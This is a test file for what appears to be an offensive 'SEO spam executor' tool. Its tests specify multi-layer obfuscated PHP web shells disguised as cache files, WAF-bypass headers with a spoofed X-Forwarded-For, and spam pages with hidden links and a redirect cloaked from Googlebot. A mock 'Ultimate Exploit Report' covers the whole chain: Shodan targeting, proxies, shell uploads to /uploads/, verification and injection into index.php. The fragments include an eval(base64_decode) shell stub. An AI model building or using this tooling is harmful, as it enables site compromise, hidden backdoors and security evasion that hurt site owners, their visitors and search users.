import { describe, it, expect } from "vitest";
import {
  multiLayerObfuscate,
  generateObfuscatedShell,
  getBypassHeaders,
  generateSpamContent,
  generateJsonReport,
  generateTxtReport,
  type ExecutionReport,
} from "./seo-spam-executor";

describe("SEO SPAM Executor", () => {
  // ═══════════════════════════════════════════════════════
  //  Multi-Layer Obfuscation
  // ═══════════════════════════════════════════════════════

  describe("multiLayerObfuscate", () => {
    it("should apply the specified number of layers", () => {
      const result = multiLayerObfuscate("test code", 4);
      expect(result.appliedLayers).toHaveLength(4);
      expect(result.obfuscated).not.toBe("test code");
    });

    it("should apply 1 layer when specified", () => {
      const result = multiLayerObfuscate("hello", 1);
      expect(result.appliedLayers).toHaveLength(1);
      expect(result.obfuscated).not.toBe("hello");
    });

    it("should apply different layer methods", () => {
      const result = multiLayerObfuscate("test", 4);
      const methods = result.appliedLayers.map(l => l.method);
      // All methods should be from the valid set
      const validMethods = ["base64", "xor_13", "reverse", "char_shift"];
      for (const m of methods) {
        expect(validMethods).toContain(m);
      }
    });

    it("should have description for each layer", () => {
      const result = multiLayerObfuscate("test", 3);
      for (const layer of result.appliedLayers) {
        expect(layer.description).toBeTruthy();
        expect(typeof layer.description).toBe("string");
      }
    });
  });

  // ═══════════════════════════════════════════════════════
  //  Shell Generation
  // ═══════════════════════════════════════════════════════

  describe("generateObfuscatedShell", () => {
    it("should generate a shell with all required fields", () => {
      const shell = generateObfuscatedShell();
      expect(shell.originalCode).toContain("<?php");
      expect(shell.obfuscatedCode).toBeTruthy();
      expect(shell.finalPayload).toContain("<?php");
      expect(shell.layers).toHaveLength(4);
      expect(shell.layerCount).toBe(4);
      expect(shell.password).toBeTruthy();
      expect(shell.password.length).toBe(12);
      expect(shell.filename).toMatch(/^cache_[a-z0-9]+\.php$/);
      expect(shell.size).toBeGreaterThan(0);
    });

    it("should generate unique shells each time", () => {
      const shell1 = generateObfuscatedShell();
      const shell2 = generateObfuscatedShell();
      expect(shell1.password).not.toBe(shell2.password);
      expect(shell1.filename).not.toBe(shell2.filename);
    });

    it("should include password in original code", () => {
      const shell = generateObfuscatedShell();
      expect(shell.originalCode).toContain(shell.password);
    });

    it("should have base64-wrapped final payload", () => {
      const shell = generateObfuscatedShell();
      expect(shell.finalPayload).toContain("base64_decode");
    });
  });

  // ═══════════════════════════════════════════════════════
  //  Bypass Headers
  // ═══════════════════════════════════════════════════════

  describe("getBypassHeaders", () => {
    it("should return required WAF bypass headers", () => {
      const headers = getBypassHeaders();
      expect(headers["User-Agent"]).toBeTruthy();
      expect(headers["Accept"]).toBeTruthy();
      expect(headers["X-Forwarded-For"]).toBeTruthy();
      expect(headers["X-Original-URL"]).toBeTruthy();
      expect(headers["Referer"]).toContain("google.com");
    });

    it("should have X-Forwarded-For with multiple IPs", () => {
      const headers = getBypassHeaders();
      expect(headers["X-Forwarded-For"]).toContain("127.0.0.1");
    });
  });

  // ═══════════════════════════════════════════════════════
  //  Spam Content Generation
  // ═══════════════════════════════════════════════════════

  describe("generateSpamContent", () => {
    it("should generate spam content with redirect URL", () => {
      const content = generateSpamContent("https://spam.com");
      expect(content).toContain("https://spam.com");
      expect(content).toContain("<title>");
      expect(content).toContain("meta name=\"description\"");
      expect(content).toContain("meta property=\"og:title\"");
      expect(content).toContain("link rel=\"canonical\"");
    });

    it("should include hidden links", () => {
      const content = generateSpamContent("https://test.com");
      expect(content).toContain("display:none");
      expect(content).toContain("href=\"https://test.com");
    });

    it("should include auto redirect script", () => {
      const content = generateSpamContent("https://redirect.com");
      expect(content).toContain("window.location.href");
      expect(content).toContain("Googlebot");
      expect(content).toContain("meta http-equiv=\"refresh\"");
    });

    it("should add http prefix if missing", () => {
      const content = generateSpamContent("spam.com");
      expect(content).toContain("https://spam.com");
    });
  });

  // ═══════════════════════════════════════════════════════
  //  Report Generation
  // ═══════════════════════════════════════════════════════

  const mockReport: ExecutionReport = {
    id: "exec_test_123",
    timestamp: "2026-03-03T00:00:00.000Z",
    targetDomain: "http://target.com",
    redirectUrl: "https://spam.com",
    steps: [
      { step: 1, name: "Shodan Search", status: "success", startTime: 1000, endTime: 2000, details: "Found 5 targets" },
    ],
    shodanResults: [
      { query: "test query", total: 5, matches: [{ ip: "1.2.3.4", port: 80, proto: "http", url: "http://1.2.3.4:80/" }] },
    ],
    proxyResults: [
      { proxy: "http://1.2.3.4:8080", working: true, ip: "1.2.3.4", responseTime: 100 },
      { proxy: "http://5.6.7.8:3128", working: false, responseTime: 5000, error: "Timeout" },
    ],
    shells: [
      {
        originalCode: "<?php eval(); ?>",
        obfuscatedCode: "obf",
        finalPayload: "<?php eval(base64_decode('...')); ?>",
        layers: [{ method: "base64", description: "Base64 encoding" }],
        layerCount: 1,
        password: "test123",
        filename: "cache_test.php",
        size: 100,
      },
    ],
    uploadAttempts: [
      { target: "http://target.com", path: "/uploads/", filename: "cache_test.php", method: "POST", statusCode: 200, success: true, shellUrl: "http://target.com/uploads/cache_test.php", wafBypassed: true, headers: {} },
    ],
    shellVerifications: [
      { shellUrl: "http://target.com/uploads/cache_test.php", active: true, tests: [], passedCount: 4, totalTests: 5 },
    ],
    injections: [
      { file: "index.php", success: true, type: "full_spam_redirect", contentInjected: "..." },
    ],
    summary: {
      targetsFound: 5,
      proxiesWorking: 1,
      shellsGenerated: 1,
      uploadsAttempted: 1,
      uploadsSuccessful: 1,
      shellsVerified: 1,
      filesInjected: 1,
      totalDuration: 5000,
    },
    jsonReport: "",
    txtReport: "",
  };

  describe("generateJsonReport", () => {
    it("should generate valid JSON", () => {
      const json = generateJsonReport(mockReport);
      const parsed = JSON.parse(json);
      expect(parsed.timestamp).toBe("2026-03-03T00:00:00.000Z");
      expect(parsed.target_input).toBe("http://target.com");
      expect(parsed.redirect_url).toBe("https://spam.com");
      expect(parsed.success_count).toBe(1);
      expect(parsed.shodan_used).toBe(true);
    });

    it("should include shodan results in JSON", () => {
      const json = generateJsonReport(mockReport);
      const parsed = JSON.parse(json);
      expect(parsed.shodan_results).toHaveLength(1);
      expect(parsed.shodan_results[0].query).toBe("test query");
    });

    it("should include proxy results in JSON", () => {
      const json = generateJsonReport(mockReport);
      const parsed = JSON.parse(json);
      expect(parsed.proxies_tested).toHaveLength(2);
    });

    it("should include summary in JSON", () => {
      const json = generateJsonReport(mockReport);
      const parsed = JSON.parse(json);
      expect(parsed.summary.targetsFound).toBe(5);
      expect(parsed.summary.totalDuration).toBe(5000);
    });
  });

  describe("generateTxtReport", () => {
    it("should generate text report with header", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("Ultimate Exploit Report");
      expect(txt).toContain("Target Input: http://target.com");
      expect(txt).toContain("Redirect to: https://spam.com");
    });

    it("should include Shodan section", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("=== Shodan Search Results ===");
      expect(txt).toContain("test query");
    });

    it("should include Proxy section", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("=== Proxy Test Results ===");
      expect(txt).toContain("✓");
      expect(txt).toContain("✗");
    });

    it("should include Summary section", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("=== Summary ===");
      expect(txt).toContain("Targets Found: 5");
      expect(txt).toContain("Proxies Working: 1");
    });

    it("should include Shell section", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("=== Shells Generated ===");
      expect(txt).toContain("cache_test.php");
    });

    it("should include Upload section", () => {
      const txt = generateTxtReport(mockReport);
      expect(txt).toContain("=== Upload Attempts ===");
    });
  });
});
